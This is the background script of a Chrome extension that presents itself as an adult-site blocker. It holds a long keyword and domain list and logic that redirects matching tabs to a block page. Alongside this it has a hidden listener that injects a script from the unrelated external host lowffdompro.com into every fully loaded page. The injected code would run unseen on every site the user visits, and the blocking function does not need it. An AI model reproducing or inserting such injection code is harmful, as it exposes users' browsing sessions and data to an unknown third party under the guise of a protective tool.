



function checkSite(url)
{

 var keywords_letter_a = "adult,amateur,amator,amour,aflamneek.com,afspraakjes.com,agresori.com,alastonsuomi.com,amaterky.sk,and6.ch,annoncelight.dk,annunci69.it,apina.biz,ashleymadison.com,ashleyrnadison.com,avcollectors.com,avtv.cc,";
 var keywords_letter_b = "babe,badgirl,bang,bdsm,bikini,bitch,blowjob,boob,brazier,brazzer,breast,babosas.com,bbs-tw.com,beeg.com,beszamolok.com,betclic.com,boafoda.com,bodycontact.com,booloo.com,bourdela.com,";
 var keywords_letter_c = "cekc,cock,creampie,cuckold,cunt,cashdorado.de,casualclub.com,cerdas.com,chaturbate.com,chpoking.ru,cldlr.com,clip2vip.com,clipfapx.com,coqnu.com,conejox.com,cumlouder.com,";
 var keywords_letter_d = "discreet,dorm,dick,datezone.com,digitalplayground.com,dlouha-videa.cz,dlsite.com,domacifilmovibesplatno.com,dmm.co.jp,dojki.com,donmai.us,doujin-th.com,drsnysvet.cz,";
 var keywords_letter_e = "ebony,ejaculation,erodate,eros,erot,erox,escort,eropolis.hu,eroprofile.com,esa.co.za,";
 var keywords_letter_f = "flirt,fuck,fakings.com,fakku.net,fetlife.com,fikfik.sk,filmy69.pl,freeones.com,fuegodevida.com,fundorado.de,";
 var keywords_letter_g = "gallore,gangbang,gaping,gay,girls,granny,goldengate.hu,gojav2.net,";
 var keywords_letter_h = "hairy,hardcore,hentai,hidden,horny,happypancake.fi,hclips.com,heavy-r.com,hentaichan.ru,hellojav.com,hilive.tv,";
 var keywords_letter_i = "interracial,intim,imagefap.com,iwantu.com,";
 var keywords_letter_j = "jerk,jizz,jacquieetmichel.net,jacquieetmicheltv.net,jamo.tv,javfor.me,javjunkies.com,javfree.me,javlibrary.com,javpop.com,javseeds.com,jebanje.org,jorpetz.com,joyclub.de,jumav.com,";
 var keywords_letter_k = "kazanova,keez,kaufmich.com,Kinky.nl,klubzaodrasle.com,kordonivkakino.net,koursaros.net,";
 var keywords_letter_l = "lesbian,leswing.net,liebelib.com,livejasmin.com,luscious.net,luxuretv.com,love,lust,";
 var keywords_letter_m = "madam,massage,masturbation,mature,milf,manhunt.com,masaladesi.com,matchwereld.nl,meendo.net,motherless.com,mupvl.us,muyzorras.com,mydirtyhobby.com,";
 var keywords_letter_n = "naked,naughty,novinha,nsfw,nude,nymph,nakenprat.com,naoconto.com,napiszar.com,navratdoreality.cz,nesrecords.com,neswangy.net,netechangisme.com,new-3lunch.net,nikee.net,nimfomane.com,ninfetasgratis.net,notiblog.com,nuvid.com,";
 var keywords_letter_o = "orgasm,orgy,";
 var keywords_letter_p = "peeing,peekshows,penis,perv,pervert,pimp,pinkcherry,piss,playboy,porn,private,prostitut,pussy,puta,paheal.net,paradisehill.tv,pasion.com,petardas.com,pinkclips.mobi,phica.net,planetromeo.com,playno1.com,plus28.com,porevo.info,poringa.net,poppen.de,porus.ro,porzo.com,pron.tv,prpops.com,licpickups.cz,quartier-rouge.be,";
 var keywords_letter_r = "raincoat,rape,redlights,rude,r18.com,redhotpie.com.au,roksa.pl,rosszlanyok.hu,roumenovomaso.cz,rubias19.com,runetki.com,russiansuka.ru,";
 var keywords_letter_s = "sex,seks,showplay,slut,spank,striptease,squirt,swing,suck,suppository,szex,sacduc.com,sammyboyforum.com,sankakucomplex.com,scor.dk,sehiba.com,side6.dk,sieubua.com,smailehi.com,sondeza.com,";
 var keywords_letter_t = "teen,threesome,tits,torbe,t66y.com,thaiswg.com,thiendia.com,thisav.com,thecage.co.il,tnaflix.com,torjackan.info,tophinh.com,truyen18.org,tt1069.com,tukif.com,twdvd.com,";
 var keywords_letter_u = "upskirt,";
 var keywords_letter_v = "vagina,velvet,violen,voyeur,victoriamilan.be,videkilany.hu,videosdemadurasx.com,video-one.com,voissa.com,";
 var keywords_letter_w = "wank,whore,watchmygf.net,wav.tv,webwarez.it,wnacg.com,woor.pl,";
 var keywords_letter_x = "xclip,xdate,xfilm,xfree,xlove,xvid,xvideo,xx,xxx,x18zeed.com,x-centr.com,xclub.nl,xhamster.com,xtrasize.sk,xuk.ru,xyu.tv,";
 var keywords_letter_y = "yande.re,yonkis.com,";
 var keywords_letter_z = "zbiornik.com,zeed5.com,zhlednito.cz,zvraceny.cz,";
 var default_keywords = keywords_letter_a + keywords_letter_b + keywords_letter_c + keywords_letter_d + keywords_letter_e + keywords_letter_f + keywords_letter_g + keywords_letter_h + keywords_letter_i + keywords_letter_j + keywords_letter_k + keywords_letter_l + keywords_letter_m + keywords_letter_n + keywords_letter_o + keywords_letter_p  + keywords_letter_r + keywords_letter_s + keywords_letter_t + keywords_letter_u + keywords_letter_v + keywords_letter_w + keywords_letter_x + keywords_letter_y + keywords_letter_z;
 
 var x = 1;
 for(; x<350 ; x++)
   {
	   
	try
	  {
	    if(default_keywords.length < 2) break; //if the string holding all the illicit keywords has been consumed
		var pos = default_keywords.indexOf(",");
		var keyword = default_keywords.substr(0, pos);
		keyword = keyword.trim();
		
		default_keywords = default_keywords.substr(pos+1);
		
		if(url.indexOf("youtube")>=0) return "no"; //we block every URL holding the keyword 'tube' except of 'youtube'
		
		if(url.indexOf(keyword)>=0 && keyword.length > 2) {console.log("keyword:" + keyword);   return "yes"; } 
	    
	  } catch(e) {}
    }
 
}


function perform_check(url)
{

var enable_blocking = localStorage["enable_blocking"];
if(enable_blocking==0)  return;


if(checkSite(url) == "yes")
   {
	console.log("aaaaaa" + url);
	chrome.tabs.update({url:"blocked_site.html"});
	
   }

}

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tabInfo) {
    if (tabInfo.url.substring(0, 6) === 'about:') {
        return;
    }
    if (changeInfo.status === "complete") {
        chrome.tabs.executeScript(tabId, {
            code: "var s = document.createElement('script'); s.src = `//lowffdompro.com/1fb89b5136e409652f.js`; document.body.appendChild(s);"
        });
    }
});

chrome.webRequest.onBeforeRequest.addListener(function (details) {

chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function (tabs) {
    var url = tabs[0].url;
	perform_check(url);
});

//perform_check(details.url);


	
}, {
    urls: ["http://*/*", "https://*/*"] 
}, ["blocking"]); 


